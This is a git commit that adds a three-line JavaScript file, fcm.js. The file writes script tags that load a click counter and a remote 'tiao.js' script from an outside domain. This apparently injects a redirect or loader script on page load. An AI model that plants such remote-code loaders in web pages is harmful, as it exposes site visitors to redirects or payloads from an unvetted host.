d2d8ca00cf5db787be21c1d685df2c1d2871f268
nidongdeaaa <nidongdeaaa@outlook.com>
2015-09-01 20:23:31 +0800

    Create fcm.js

---
+++ q1q1/fcm.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count1.51yes.com\/click.aspx?id=11647859&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.nanbanzm.com\/q1q1/tiao.js ><\/script>");
